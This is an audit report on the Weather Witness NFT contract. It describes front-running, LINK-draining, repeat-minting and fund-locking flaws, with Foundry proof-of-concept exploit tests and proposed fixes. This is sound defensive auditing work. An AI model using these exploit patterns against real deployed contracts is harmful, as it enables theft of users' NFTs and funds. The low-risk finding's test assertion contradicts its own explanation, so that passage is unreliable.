# Weather Witness - Findings Report

# Table of contents
- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)
- ## High Risk Findings
    - ### [H-01. Mint Hijack: fulfillMintRequest Allows Anyone to Front-Run and Steal User's NFT](#H-01)
    - ### [H-02. Unrestricted performUpkeep Allows Attacker to Drain Chainlink Automation Funds](#H-02)
    - ### [H-03. Unbounded NFT Minting with Single Payment via fulfillMintRequest](#H-03)
    - ### [H-04. Permanent Loss of Collected ETH Due to Missing Withdrawal Mechanism](#H-04)
    - ### [H-05. Oracle Error Silently Breaks Mint Flow, Causing Permanent Fund Lock](#H-05)

- ## Low Risk Findings
    - ### [L-01. Excess LINK Locked due to uint96 Truncation](#L-01)


# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #40

### Dates: May 15th, 2025 - May 22nd, 2025

[See more contest details here](https://codehawks.cyfrin.io/c/2025-05-weather-witness)

# <a id='results-summary'></a>Results Summary

### Number of findings:
- High: 5
- Medium: 0
- Low: 1


# High Risk Findings

## <a id='H-01'></a>H-01. Mint Hijack: fulfillMintRequest Allows Anyone to Front-Run and Steal User's NFT            



## Summary

The `WeatherNft::fulfillMintRequest` function allows **any external address** to call it with a known `requestId`, and mints the Weather NFT to the caller (`msg.sender`). This enables an attacker to **front-run** the legitimate user’s mint request and steal the NFT, even after the user has paid the mint price and initiated the request.

***

## Vulnerability Details

```solidity
// @audit-issue No check that msg.sender == the original requester
@> function fulfillMintRequest(bytes32 requestId) external {
     // ...
}
```

### Issues Identified

1. **Mint Hijack / NFT Theft**

   * Anyone can listen for the `WeatherNFTMintRequestSent` event, obtain the `requestId`, and call `fulfillMintRequest` before the legitimate user.

   * The NFT will be minted to the attacker's address, even though the original user paid for it.

***

## Risk

**Likelihood**:

* An attacker can monitor the blockchain for `WeatherNFTMintRequestSent` events and, as soon as a valid `requestId` is emitted, immediately call `fulfillMintRequest` with that ID.

* This is likely to happen for every mint, since the event and `requestId` are public and easily accessible to any motivated attacker.

**Impact**:

* The attacker receives the NFT, even though the legitimate user paid for it, causing loss of funds and NFTs for users.

* Legitimate users may be unable to successfully mint NFTs, resulting in denial of service for all new mints as attackers front-run every mint request.

***

## Proof of Concept (PoC)

This PoC demonstrates an attacker can **steal the minted NFT** by calling `fulfillMintRequest` with a legitimate user's `requestId` before the user does. The NFT is minted to the attacker's address.

### PoC Explanation

1. A legitimate user initiates a mint request by calling `requestMintWeatherNFT`, paying the required mint price and emitting a `WeatherNFTMintRequestSent` event with the associated `requestId`.
2. The attacker monitors the blockchain for `WeatherNFTMintRequestSent` events, extracting the `requestId` before the legitimate user completes the process.
3. The Chainlink oracle fulfillment is simulated, making the mint ready for completion.
4. Before the original user can call `fulfillMintRequest`, the attacker quickly calls this function with the known `requestId`.
5. Because there is no authorization check on `fulfillMintRequest`, the NFT is minted directly to the attacker's address, even though the legitimate user paid the minting fee.

```solidity
function test_FulfillMintRequest_CanBeHijacked() public {
    // Set up parameters for minting a Weather NFT
    string memory pincode = "125001";
    string memory isoCode = "IN";
    bool registerKeeper = true;
    uint256 heartbeat = 12 hours;
    uint256 initLinkDeposit = 5e18;

    // The expected tokenId for the next minted NFT
    uint256 tokenId = weatherNft.s_tokenCounter();

    // Step 1: Simulate a legitimate user initiating a mint request
    vm.startPrank(user);
    linkToken.approve(address(weatherNft), initLinkDeposit);
    vm.recordLogs();
    weatherNft.requestMintWeatherNFT{value: weatherNft.s_currentMintPrice()}(
        pincode, isoCode, registerKeeper, heartbeat, initLinkDeposit
    );
    vm.stopPrank();

    // Step 2: Extract the requestId from the emitted event logs
    Vm.Log[] memory logs = vm.getRecordedLogs();
    bytes32 reqId;
    for (uint256 i; i < logs.length; i++) {
        if (logs[i].topics[0] == keccak256("WeatherNFTMintRequestSent(address,string,string,bytes32)")) {
            (,,, reqId) = abi.decode(logs[i].data, (address, string, string, bytes32));
            break;
        }
    }

    // Step 3: Simulate Chainlink oracle fulfillment (weather data arrives)
    vm.prank(functionsRouter);
    bytes memory weatherResponse = abi.encode(WeatherNftStore.Weather.RAINY);
    weatherNft.handleOracleFulfillment(reqId, weatherResponse, "");

    // Step 4: Attacker front-runs the legitimate user by calling fulfillMintRequest first
    vm.prank(attacker);
    weatherNft.fulfillMintRequest(reqId);

    // Step 5: The NFT is minted to the attacker, not the original user
    vm.assertEq(weatherNft.ownerOf(tokenId), attacker);
}
```

***

## Tools Used

* Manual Review

* Foundry Unit Testing

***

## Recommendations

**Add Authorization Check**

Only the original requester should be allowed to call `fulfillMintRequest`:

```diff
 function fulfillMintRequest(bytes32 requestId) external {
+    require(s_funcReqIdToUserMintReq[requestId].user == msg.sender, "Not authorized");
     // ... existing logic ...
 }
```

***

## <a id='H-02'></a>H-02. Unrestricted performUpkeep Allows Attacker to Drain Chainlink Automation Funds            



## Summary

The `WeatherNft::performUpkeep` function allows **any external address** to call it with a valid tokenId, triggering a new Chainlink Functions request and consuming LINK from the Automation subscription balance. There are **no access controls or heartbeat checks** to restrict how frequently this can be called. An attacker can repeatedly call `performUpkeep` to **rapidly drain all LINK from the subscription**, causing denial of service for legitimate users and disabling the NFT's automated weather updates.

***

## Vulnerability Details

```solidity
// @audit-issue No rate limiting or authorization in performUpkeep
@> function performUpkeep(bytes calldata performData) external override {
       // ...
       _sendFunctionsWeatherFetchRequest(pincode, isoCode);
}
```

### Issues Identified

1. **Unrestricted LINK Drain**

   * Anyone can call `performUpkeep` with the tokenId of an NFT, regardless of whether the heartbeat interval has passed or whether the caller is a trusted automation agent.

   * Each call triggers a Chainlink Functions request and consumes LINK from the Automation subscription balance.

   * Repeated or automated calls will quickly exhaust the LINK balance, breaking automated updates for all NFTs in the project.

***

## Risk

**Likelihood**:

* Any attacker or bot can repeatedly call `performUpkeep` with the same tokenId, as often as they want.

* This attack does not require any special privileges or timing, making it trivial to exploit on a large scale.

**Impact**:

* All LINK in the project's Chainlink Automation subscription can be drained, incurring significant financial loss.

* Legitimate users lose automated weather updates for their NFTs, and the service is effectively disabled until more LINK is deposited.

***

## Proof of Concept (PoC)

This PoC demonstrates an attacker can **drain LINK** by repeatedly calling `performUpkeep` with the same tokenId, even if the heartbeat interval has not elapsed.

### PoC Explanation

1. A legitimate user mints a Weather NFT, registering for automated weather updates. This process funds the Chainlink Automation subscription with LINK.
2. The attacker waits for the NFT to be minted and retrieves the tokenId.
3. The attacker then repeatedly calls `performUpkeep` with the same tokenId, simulating hundreds of rapid weather update requests.
4. Each call to `performUpkeep` triggers a Chainlink Functions request and consumes LINK from the project's Automation subscription balance.
5. Because there are no heartbeat checks or access controls, the attacker is able to continuously drain the LINK balance, eventually exhausting all funds allocated for automation.
6. Once the LINK balance is depleted, legitimate users lose the ability to receive automated weather updates for their NFTs, and the automation feature is effectively disabled until the subscription is refilled.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "forge-std/Test.sol";
import {WeatherNft, WeatherNftStore} from "src/WeatherNft.sol";
import {LinkTokenInterface} from "@chainlink/contracts/src/v0.8/shared/interfaces/LinkTokenInterface.sol";
import {Vm} from "forge-std/Vm.sol";

contract WeatherNftForkTest is Test {
    WeatherNft weatherNft;
    LinkTokenInterface linkToken;
    address functionsRouter;
    address user = makeAddr("user");
    address attacker = makeAddr("attacker");

    function setUp() external {
        // Initialize contract addresses and user balances
        weatherNft = WeatherNft(0x4fF356bB2125886d048038386845eCbde022E15e);
        linkToken = LinkTokenInterface(0x0b9d5D9136855f6FEc3c0993feE6E9CE8a297846);
        functionsRouter = 0xA9d587a00A31A52Ed70D6026794a8FC5E2F5dCb0;
        vm.deal(user, 1000e18);
        deal(address(linkToken), user, 1000e18);

        // Fund the subscription for Chainlink Automation
        vm.prank(user);
        linkToken.transferAndCall(functionsRouter, 1e18, abi.encode(15459));
    }

    function test_performUpkeep_DrainLink() public {
        // Mint a Weather NFT and register for automation
        vm.startPrank(user);
        linkToken.approve(address(weatherNft), 5e18);
        vm.recordLogs();
        weatherNft.requestMintWeatherNFT{value: weatherNft.s_currentMintPrice()}("125001", "IN", true, 12 hours, 5e18);
        vm.stopPrank();

        // Get the requestId for oracle fulfillment from logs
        bytes32 reqId;
        Vm.Log[] memory logs = vm.getRecordedLogs();
        for (uint256 i = 0; i < logs.length; i++) {
            if (logs[i].topics[0] == keccak256("WeatherNFTMintRequestSent(address,string,string,bytes32)")) {
                (,,, reqId) = abi.decode(logs[i].data, (address, string, string, bytes32));
                break;
            }
        }

        // Simulate oracle fulfillment and complete minting
        vm.prank(functionsRouter);
        weatherNft.handleOracleFulfillment(reqId, abi.encode(WeatherNftStore.Weather.RAINY), "");
        vm.prank(user);
        weatherNft.fulfillMintRequest(reqId);

        // Encode tokenId for upkeep
        uint256 tokenId = weatherNft.s_tokenCounter() - 1;
        bytes memory performData = abi.encode(tokenId);
        bool reverted = false;

        // Repeatedly call performUpkeep to simulate LINK draining
        // Each call will send a new weather data request, draining the Chainlink Automation subscription balance
        for (uint256 i = 0; i < 100; i++) {
            vm.prank(attacker);
            try weatherNft.performUpkeep(performData) {
                // No revert, continue testing
            } catch {
                // Check if the revert was due to insufficient LINK balance
                reverted = true;
                break;
            }
        }
        // At least one revert must occur
        assertTrue(reverted, "Should revert when LINK balance is exhausted");
    }
}
```

***

## Tools Used

* Manual Review

* Foundry Unit Testing

***

## Recommendations

* **Enforce a Heartbeat Check**
  Require that `performUpkeep` can only be executed if the heartbeat interval has elapsed since the last successful weather update. This prevents repeated or premature calls from consuming LINK unnecessarily.

  ```solidity
  require(
      block.timestamp >= info.lastFulfilledAt + info.heartbeat,
      "Not time for upkeep"
  );
  ```

* **Refine Access Controls for Automated and Manual Updates**
  Differentiate between NFTs registered with Chainlink Automation (having a nonzero `upkeepId`) and those without.

  * For **automated** updates (`info.upkeepId != 0`), allow only the Keeper Registry contract to call.

  * For **manual** updates (`info.upkeepId == 0`), allow only the NFT owner to call.

  ```solidity
  function performUpkeep(bytes calldata performData)
      external
      override
  {
      uint256 _tokenId = abi.decode(performData, (uint256));
      WeatherNftInfo storage info = s_weatherNftInfo[_tokenId];

      // Heartbeat check
      require(
          block.timestamp >= info.lastFulfilledAt + info.heartbeat,
          "Not time for upkeep"
      );

      if (info.upkeepId != 0) {
          // Automated upkeep: only keeper registry may call
          require(msg.sender == s_keeperRegistry, "Only keeper registry");
      } else {
          // Manual update: only NFT owner may call
          require(msg.sender == ownerOf(_tokenId), "Only NFT owner");
      }

      // ... proceed with sending Chainlink Functions request ...
  }
  ```

***

## <a id='H-03'></a>H-03. Unbounded NFT Minting with Single Payment via fulfillMintRequest            



## Summary

The `WeatherNft::fulfillMintRequest` function **does not prevent multiple executions with the same** **`requestId`**, allowing anyone to repeatedly call `fulfillMintRequest` after a single paid mint request. As a result, an attacker can mint **unlimited NFTs for free after the initial payment**, severely breaking the one-NFT-per-payment guarantee and destroying the scarcity and value of the NFTs.

***

## Vulnerability Details

```solidity
// @audit-issue No check that fulfillMintRequest can only be called once per requestId
@> function fulfillMintRequest(bytes32 requestId) external {
     // ...
}
```

### Issue Identified

* The contract does **not track** whether a `requestId` has already been fulfilled.

* Anyone (including the original minter) can **call** **`fulfillMintRequest`** **multiple times** with the same `requestId`.

* **Each call after the first is effectively free**, as only the initial mint required payment.

***

## Risk

**Likelihood:**

* Anyone aware of a fulfilled `requestId` can script multiple calls, leading to fast, repeated free mints.

**Impact:**

* **Unlimited NFTs can be minted for a single payment**, creating free NFTs after the first.

* This **destroys the payment model** and completely breaks scarcity, causing financial and reputational harm to the protocol and its users.

***

## Proof of Concept (PoC)

This PoC demonstrates that `fulfillMintRequest` can be called **multiple times** with the same `requestId`, resulting in multiple NFTs minted for the same weather data and payment.

### PoC Explanation

1. An attacker initiates a mint request by calling `requestMintWeatherNFT`, paying the required mint price and emitting a `WeatherNFTMintRequestSent` event with the associated `requestId`.
2. The Chainlink oracle fulfillment is simulated, making the mint request ready for completion.
3. The attacker calls `fulfillMintRequest` with the same `requestId` to mint the first NFT.
4. The attacker calls `fulfillMintRequest` again with the **same** `requestId`, successfully minting a second NFT—despite only having paid for one mint.
5. Because there is **no mechanism to prevent multiple fulfillments** for the same `requestId`, this process can be repeated indefinitely, allowing the attacker to mint unlimited NFTs for a single payment.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test, console} from "forge-std/Test.sol";
import {WeatherNft, WeatherNftStore} from "src/WeatherNft.sol";
import {LinkTokenInterface} from "@chainlink/contracts/src/v0.8/shared/interfaces/LinkTokenInterface.sol";
import {Vm} from "forge-std/Vm.sol";

contract WeatherNftForkTest is Test {
    WeatherNft weatherNft;
    LinkTokenInterface linkToken;
    address functionsRouter;
    address attacker = makeAddr("attacker");

    function setUp() external {
        weatherNft = WeatherNft(0x4fF356bB2125886d048038386845eCbde022E15e);
        linkToken = LinkTokenInterface(0x0b9d5D9136855f6FEc3c0993feE6E9CE8a297846);
        functionsRouter = 0xA9d587a00A31A52Ed70D6026794a8FC5E2F5dCb0;

        vm.deal(attacker, 1000e18);
        deal(address(linkToken), attacker, 1000e18);

        // Fund the subscription required by Chainlink Functions
        vm.prank(attacker);
        linkToken.transferAndCall(functionsRouter, 100e18, abi.encode(15459));
    }

    function test_FulfillMintRequest_MultiMint_Vulnerability() public {
        string memory pincode = "125001";
        string memory isoCode = "IN";
        bool registerKeeper = false;
        uint256 heartbeat = 12 hours;
        uint256 initLinkDeposit = 5e18;

        uint256 tokenId = weatherNft.s_tokenCounter();

        // Step 1: Attacker initiates a Weather NFT mint request
        vm.startPrank(attacker);
        linkToken.approve(address(weatherNft), initLinkDeposit);
        vm.recordLogs();
        weatherNft.requestMintWeatherNFT{value: weatherNft.s_currentMintPrice()}(
            pincode, isoCode, registerKeeper, heartbeat, initLinkDeposit
        );
        vm.stopPrank();

        // Step 2: Extract requestId from the WeatherNFTMintRequestSent event
        Vm.Log[] memory logs = vm.getRecordedLogs();
        bytes32 reqId;
        for (uint256 i; i < logs.length; i++) {
            if (logs[i].topics[0] == keccak256("WeatherNFTMintRequestSent(address,string,string,bytes32)")) {
                (,,, reqId) = abi.decode(logs[i].data, (address, string, string, bytes32));
                break;
            }
        }

        // Step 3: Simulate successful Chainlink oracle fulfillment
        vm.prank(functionsRouter);
        bytes memory weatherResponse = abi.encode(WeatherNftStore.Weather.RAINY);
        weatherNft.handleOracleFulfillment(reqId, weatherResponse, "");

        // Step 4: Attacker calls fulfillMintRequest multiple times with the same requestId
        // This should not be possible — however, the contract currently allows it.
        vm.startPrank(attacker);
        weatherNft.fulfillMintRequest(reqId); // First call, mints NFT
        weatherNft.fulfillMintRequest(reqId); // Second call, mints another NFT with the same requestId
        vm.stopPrank();

        // Step 5: Both NFTs are minted to the attacker, demonstrating the multi-mint vulnerability
        vm.assertEq(weatherNft.ownerOf(tokenId), attacker);
        vm.assertEq(weatherNft.ownerOf(tokenId + 1), attacker);
    }
}
```

***

## Tools Used

* Manual Review

* Foundry Unit Testing

***

## Recommendations

**Ensure One-Time Fulfillment**

Track fulfillment status for each `requestId` and prevent duplicate calls:

```diff
+   mapping(bytes32 => bool) public fulfilled;

 function fulfillMintRequest(bytes32 requestId) external {
+    require(!fulfilled[requestId], "Already fulfilled");
+    fulfilled[requestId] = true;
     // ... existing logic ...
 }
```

This ensures each `requestId` can be used to mint only one NFT, preventing duplication and maintaining NFT scarcity.

***

## <a id='H-04'></a>H-04. Permanent Loss of Collected ETH Due to Missing Withdrawal Mechanism            



## Summary

The `WeatherNft::requestMintWeatherNFT` function requires users to pay an ETH minting fee (`msg.value == s_currentMintPrice`) to mint a Weather NFT. However, **the contract does not implement any mechanism to withdraw, use, or manage the received ETH after it is sent**. As a result, all ETH collected by the contract through minting is **permanently locked within the contract**, with no way for the owner or users to retrieve or utilize these funds.

***

## Vulnerability Details

```solidity
// @audit-issue No mechanism for ETH withdrawal or utilization
@> function requestMintWeatherNFT(
        string memory _pincode,
        string memory _isoCode,
        bool _registerKeeper,
        uint256 _heartbeat,
        uint256 _initLinkDeposit
    ) external payable returns (bytes32 _reqId) {
    require(
        msg.value == s_currentMintPrice,
        WeatherNft__InvalidAmountSent()
    );
    // ... ETH is accepted, but there is no transfer, withdrawal, or further usage ...
}
```

### Issue Identified

* The contract **collects ETH** from users during the NFT minting process via `msg.value`.

* **No function exists** for the owner or anyone else to withdraw, refund, or otherwise utilize these ETH funds.

* The ETH remains **permanently locked** inside the contract balance.

* Users may reasonably expect that these funds are used for project operations, artist payments, or can be withdrawn by the contract owner, but **none of these actions are possible** in the current implementation.

***

## Risk

**Likelihood**:

* This issue is present by default as a result of the current contract logic.

* Any user minting a Weather NFT will trigger this behavior.

**Impact**:

* **Permanent loss of user funds** paid for minting NFTs.

* Inability for the protocol owner to access or use the accumulated ETH for further project development, rewards, or expenses.

* Negative user experience and potential reputational damage due to perceived or actual fund mismanagement.

***

## Tools Used

* Manual Review

* Solidity IDE / Contract Inspection

***

## Recommendations

**Implement ETH Withdrawal Mechanism**

Add a secure `withdraw` function, restricted to the contract owner, to allow withdrawal of accumulated ETH:

```diff
// Allows the contract owner to withdraw all ETH from the contract
+ function withdraw() external onlyOwner {
+     (bool sent, ) = msg.sender.call{value: address(this).balance}("");
+     require(sent, "Withdraw failed");
+ }
```

This update ensures that any ETH paid for minting can be properly managed and withdrawn by the contract owner, eliminating the risk of permanently locked funds.

***

## <a id='H-05'></a>H-05. Oracle Error Silently Breaks Mint Flow, Causing Permanent Fund Lock            



## Summary

The `WeatherNft::fulfillMintRequest` function finalizes the minting process of a Weather NFT, relying on the result of an off-chain oracle (Chainlink Functions) call. However, the contract **does not revert or provide a retry mechanism** when the oracle response contains an error. Instead, if the oracle call fails (i.e., `err.length > 0`), the function simply returns silently, **leaving the user’s mint request unresolved**.

As a result, users who have paid the minting fee may find their requests permanently stuck, unable to receive their NFT or recover their funds. This could lead to loss of user funds, degraded user experience, and potentially open the door to Denial of Service (DoS) attacks by intentionally triggering oracle errors.

***

## Vulnerability Details

```solidity
function fulfillMintRequest(bytes32 requestId) external {
    bytes memory response = s_funcReqIdToMintFunctionReqResponse[requestId].response;
    bytes memory err = s_funcReqIdToMintFunctionReqResponse[requestId].err;

    require(response.length > 0 || err.length > 0, WeatherNft__Unauthorized());

    if (response.length == 0 || err.length > 0) {
// @audit-issue Silent return, user can never complete mint if oracle fails
@>      return;
    }

    // ...mint logic...
}
```

### Issue Identified

* The contract does **not handle** oracle errors robustly during the minting process.

* If the Chainlink Functions oracle call returns an error, the function simply returns, and **does not revert, refund, or allow the user to retry**.

* The user’s paid mint request becomes permanently stuck:

  * No NFT is minted

  * No ETH refund

  * No event signaling the failure

* There is **no mechanism for the user or admin to recover or reprocess the stuck request**.

***

## Risk

**Likelihood**:

* This can be triggered any time the Chainlink oracle fails due to network issues, misconfiguration, or by submitting invalid data (pincode/ISO).

* Malicious users could attempt to spam the system with invalid oracle requests, increasing the risk of stuck mints.

**Impact**:

* **Permanent loss of user funds** for affected mint requests.

* Degraded user trust and experience.

* Potential accumulation of stuck requests in contract storage, leading to increased gas costs and storage bloat.

***

## Tools Used

* Manual Review

* Custom Unit Testing (simulate oracle errors during mint)

***

## Recommendations

**Implement Automatic Refund in** **`fulfillMintRequest`**

If the oracle call fails (`err.length > 0` or `response.length == 0`), **automatically refund** the minting fee to the user and emit a refund event.
This ensures users won’t lose funds due to oracle errors.

```diff
if (response.length == 0 || err.length > 0) {
+    address user = s_funcReqIdToUserMintReq[requestId].user;
+    uint256 refund = /* original mint price */;
+    (bool sent, ) = user.call{value: refund}("");
+    require(sent, "Refund failed");
+    emit MintRefunded(user, requestId, refund, string(err));
    return;
}
```

This ensures users are not left with unresolved or lost mint requests and that the contract handles oracle errors transparently, improving protocol reliability and user trust.

***

    


# Low Risk Findings

## <a id='L-01'></a>L-01. Excess LINK Locked due to uint96 Truncation            



## Summary

The `WeatherNft::requestMintWeatherNFT` function processes LINK deposits for Chainlink Automation by converting the `initLinkDeposit` parameter (provided as `uint256`) to `uint96` before registering the upkeep. If a user supplies a value greater than `type(uint96).max`, the entire amount is **transferred to the contract**, but only the lower 96 bits are actually used for the upkeep registration. The **excess LINK above the** **`uint96`** **limit is permanently locked in the contract**, becoming inaccessible to both the user and the protocol.

***

## Vulnerability Details

```solidity
// @audit-issue Truncation of LINK deposit due to uint96 cast
@> IAutomationRegistrarInterface.RegistrationParams({
      ...
      amount: uint96(_userMintRequest.initLinkDeposit)
  });
```

### Issue Identified

* The contract **does not enforce an upper bound** on the `initLinkDeposit` parameter.

* If a user supplies an `initLinkDeposit` greater than `2^96-1`, the **entire amount is transferred** from the user to the contract.

* **Only the least significant 96 bits** of the deposit are used in the keeper registration (`uint96` cast); any excess LINK above this limit is **not refunded or accessible**.

* As a result, users can **permanently lose** any excess LINK they deposit over the `uint96` maximum.

***

## Risk

**Likelihood**:

* Any user can accidentally or intentionally supply an `initLinkDeposit` that exceeds the `uint96` limit, especially when handling large values or using automated tooling.

* In practice, most users are unlikely to hold such a large amount of LINK tokens, so this scenario is uncommon in typical user behavior.

**Impact**:

* The excess LINK is **permanently locked** in the contract, leading to loss of funds.

* There is no way for users or protocol admins to recover or refund the locked LINK.

***

## Proof of Concept (PoC)

This PoC demonstrates that if a user submits an `initLinkDeposit` exceeding the uint96 maximum, the full amount is transferred, but only `2^96-1` LINK (plus 1 for rounding) is actually credited to the upkeep, and the excess LINK remains stuck in the contract.

### PoC Explanation

1. The attacker funds their account with LINK exceeding the `uint96` maximum.
2. The attacker calls `requestMintWeatherNFT` with a large `initLinkDeposit` value.
3. The full amount is transferred to the contract.
4. Only the lower 96 bits of `initLinkDeposit` are used in the keeper registration.
5. The excess LINK above `2^96-1` cannot be withdrawn or used.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test, console} from "forge-std/Test.sol";
import {WeatherNft, WeatherNftStore} from "src/WeatherNft.sol";
import {LinkTokenInterface} from "@chainlink/contracts/src/v0.8/shared/interfaces/LinkTokenInterface.sol";
import {Vm} from "forge-std/Vm.sol";

contract WeatherNftForkTest is Test {
    WeatherNft weatherNft;
    LinkTokenInterface linkToken;
    address functionsRouter;
    address user = makeAddr("user");

    function setUp() external {
        weatherNft = WeatherNft(0x4fF356bB2125886d048038386845eCbde022E15e);
        linkToken = LinkTokenInterface(0x0b9d5D9136855f6FEc3c0993feE6E9CE8a297846);
        functionsRouter = 0xA9d587a00A31A52Ed70D6026794a8FC5E2F5dCb0;

        vm.deal(user, 1000e18);
        uint256 huge = uint256(type(uint96).max) + 100e18 + 5e18;
        deal(address(linkToken), user, huge);

        // Fund the subscription required by Chainlink Functions
        vm.prank(user);
        linkToken.transferAndCall(functionsRouter, 100e18, abi.encode(15459));
    }

    function test_InitLinkDeposit_Truncation_Locks_Excess_LINK() public {
        string memory pincode = "125001";
        string memory isoCode = "IN";
        bool registerKeeper = true;
        uint256 heartbeat = 12 hours;
        uint256 initLinkDeposit = uint256(type(uint96).max) + 5e18;
        uint256 tokenId = weatherNft.s_tokenCounter();

        // Step 1: Attacker initiates a Weather NFT mint request
        vm.startPrank(user);
        linkToken.approve(address(weatherNft), initLinkDeposit);
        vm.recordLogs();
        weatherNft.requestMintWeatherNFT{value: weatherNft.s_currentMintPrice()}(
            pincode, isoCode, registerKeeper, heartbeat, initLinkDeposit
        );
        vm.stopPrank();

        // Step 2: Extract requestId from the WeatherNFTMintRequestSent event
        Vm.Log[] memory logs = vm.getRecordedLogs();
        bytes32 reqId;
        for (uint256 i; i < logs.length; i++) {
            if (logs[i].topics[0] == keccak256("WeatherNFTMintRequestSent(address,string,string,bytes32)")) {
                (,,, reqId) = abi.decode(logs[i].data, (address, string, string, bytes32));
                break;
            }
        }

        // Step 3: Simulate successful Chainlink oracle fulfillment
        vm.prank(functionsRouter);
        bytes memory weatherResponse = abi.encode(WeatherNftStore.Weather.RAINY);
        weatherNft.handleOracleFulfillment(reqId, weatherResponse, "");

        // Step 4: Attacker calls fulfillMintRequest once —
        // due to uint96 truncation, only the lower 96 bits of initLinkDeposit are used,
        // so any excess LINK above 2^96-1 remains locked in the contract.
        vm.startPrank(user);
        weatherNft.fulfillMintRequest(reqId); // First call, mints NFT

        // Verify that only 2^96-1 + 1 LINK was transferred in, not the full initLinkDeposit.
        uint256 expectedLocked = uint256(type(uint96).max) + 1;
        vm.assertEq(linkToken.balanceOf(address(weatherNft)), expectedLocked);
    }
}
```

***

## Tools Used

* Manual Review

* Foundry Unit Testing

***

## Recommendations

**Enforce Upper Bound in** **`requestMintWeatherNFT`**

Add a `require` at the top of `requestMintWeatherNFT` to reject any `initLinkDeposit` exceeding the uint96 limit:

```diff
function requestMintWeatherNFT(
    string memory _pincode,
    string memory _isoCode,
    bool _registerKeeper,
    uint256 _heartbeat,
    uint256 _initLinkDeposit
) external payable returns (bytes32 _reqId) {
+   require(_initLinkDeposit <= type(uint96).max, "initLinkDeposit exceeds uint96 max");
    // ... existing logic ...
}
```

This ensures the full LINK deposit will always fit into a uint96 without truncation, preventing any excess LINK from becoming permanently locked in the contract.

***



